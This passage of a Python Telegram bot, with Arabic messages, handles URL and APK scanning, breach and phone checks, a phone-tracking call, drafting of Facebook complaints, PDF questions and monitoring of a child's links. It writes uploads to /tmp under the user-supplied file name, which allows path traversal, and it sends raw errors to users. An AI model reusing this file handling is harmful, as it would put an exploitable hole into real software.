                result, status = scan_url_real(text)
                bot.send_message(chat_id, f"🔍 <b>نتيجة الفحص</b>\n{result}", parse_mode='HTML')
            else:
                bot.send_message(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ai":
            response = ai_chat_real(text)
            bot.send_message(chat_id, response, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_image":
            if len(text) < 5:
                bot.send_message(chat_id, "❌ الوصف قصير.")
                return
            img_data, msg = generate_image_real(text)
            if img_data:
                bot.send_photo(chat_id, img_data, caption="🎨 الصورة المولدة")
            else:
                bot.send_message(chat_id, msg, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_fb_hacked":
            if not re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', text):
                bot.send_message(chat_id, "❌ بريد غير صحيح.")
                return
            bot.send_message(chat_id, "⏳ جاري فحص البريد...")
            result = check_breach(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            feature_usage["فحص تسريبات"] += 1
            user_states[chat_id] = None
            return

        if state == "waiting_for_spam_num":
            if not re.match(r'^\+?\d{7,15}$', text):
                bot.send_message(chat_id, "❌ رقم غير صالح.")
                return
            bot.send_message(chat_id, "⏳ جاري فحص الرقم...")
            result = verify_phone(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            feature_usage["فحص رقم هاتف"] += 1
            user_states[chat_id] = None
            return

        # بلاغ فيسبوك
        if state == "waiting_for_fb_report_type":
            if text not in FB_REPORT_TYPES:
                bot.send_message(chat_id, "❌ نوع غير صحيح.")
                return
            report_type = FB_REPORT_TYPES[text]
            user_states[chat_id] = "waiting_for_fb_report_reason"
            user_states[f"{chat_id}_fb_report_type"] = report_type
            bot.send_message(chat_id, f"✅ تم اختيار: {report_type}\n\nالآن اكتب شرحاً مفصلاً.", parse_mode='HTML')
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            bot.send_message(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو 'لا يوجد').")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                bot.send_message(chat_id, "❌ حدث خطأ.")
                user_states[chat_id] = None
                return
            bot.send_message(chat_id, "⏳ جاري إنشاء الشكوى...")
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "Fake Account": "https://www.facebook.com/help/contact/1743260659609308",
                "Offensive": "https://www.facebook.com/help/contact/315847653073855",
                "Harassment": "https://www.facebook.com/help/contact/237547145079192",
                "Impersonation": "https://www.facebook.com/help/contact/165143319009650",
                "Privacy": "https://www.facebook.com/help/contact/207640860572618"
            }
            support_link = "https://www.facebook.com/help/contact/"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 <b>شكوى رسمية</b>\n\n"
                f"<code>{report_text}</code>\n\n"
                f"🔗 <b>رابط الدعم:</b> {support_link}\n\n"
                f"📌 انسخ النص وارسل عبر الرابط."
            )
            bot.send_message(chat_id, final_msg, parse_mode='HTML')
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        # مراقبة الروابط للأطفال
        if chat_id in linked_users and state is None:
            device_info = get_device(chat_id)
            if device_info and "طفل" in device_info['type']:
                blocked = get_blocked_domains(chat_id)
                urls = re.findall(r'https?://([^/\s]+)', text)
                for domain in urls:
                    if domain in blocked:
                        bot.send_message(chat_id, f"🚫 تم حظر هذا الموقع.")
                        bot.send_message(ADMIN_ID, f"🚸 حظر موقع من الطفل {chat_id}: {domain}")
                        log_child_activity(chat_id, f"محاولة زيارة موقع محظور: {domain}")
                        return
            urls = re.findall(r'https?://[^\s]+', text)
            for url in urls:
                result, status = scan_url_real(url)
                if status in ['malicious', 'suspicious']:
                    bot.send_message(chat_id, f"🚨 <b>تحذير:</b> الرابط <code>{url}</code> قد يكون خطيراً.\n{result}", parse_mode='HTML')
                    bot.send_message(ADMIN_ID, f"⚠️ رابط مشبوه من {chat_id}: {url}")
                    break

        # معالج افتراضي
        if state is None:
            bot.send_message(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ في معالج النصوص: {str(e)}", is_error=True)
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الملفات =====================

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    temp_file_path = None

    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                bot.send_message(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = f"/tmp/{file_name}"
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            bot.send_message(
                chat_id,
                f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك.",
                parse_mode='HTML'
            )
            if temp_file_path and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                bot.send_message(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = f"/tmp/{file_name}"
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            result, status = scan_apk_real(downloaded, file_name)
            bot.send_message(chat_id, f"📦 <b>نتيجة الفحص</b>\n{result}", parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                bot.send_message(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                review = ai_chat_real(f"مراجعة الكود التالي واكتشاف الثغرات:\n\n{content[:2000]}")
                bot.send_message(chat_id, f"🛠️ <b>مراجعة الكود</b>\n{review}", parse_mode='HTML')
            except:
                bot.send_message(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return

        if chat_id in linked_users:
            bot.send_message(chat_id, "📎 تم استلام الملف.")
        else:
            bot.send_message(chat_id, "📎 لفحص الملفات، فعّل الخدمات أولاً.")

    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        notify_admin(f"خطأ في معالج الملفات: {str(e)}", is_error=True)
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except:
                pass

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    if chat_id in linked_users:
        bot.send_message(chat_id, "🖼️ تم استلام الصورة.")
    else:
        bot.send_message(chat_id, "🖼️ لفحص الصور، فعّل الخدمات أولاً.")

# ===================== معالج الرد الافتراضي =====================

@bot.message_handler(func=lambda message: True)
def default_reply(message):
    if not message.text.startswith('/'):
        bot.reply_to(message, "🤖 البوت يعمل. استخدم /start للقائمة.")

# ===================== إعداد Webhook =====================

def set_webhook():
    if not SERVER_URL:
        return False
    webhook_full_url = f"{SERVER_URL}/webhook"
    try:
        bot.remove_webhook()
        time.sleep(1)
        success = bot.set_webhook(url=webhook_full_url)
        if success:
            logger.info(f"✅ Webhook: {webhook_full_url}")
            return True
        else:
            logger.error("❌ فشل Webhook.")
            return False
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        return False

# ===================== تشغيل التطبيق =====================

if USE_WEBHOOK:
    set_webhook()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=PORT, debug=False)
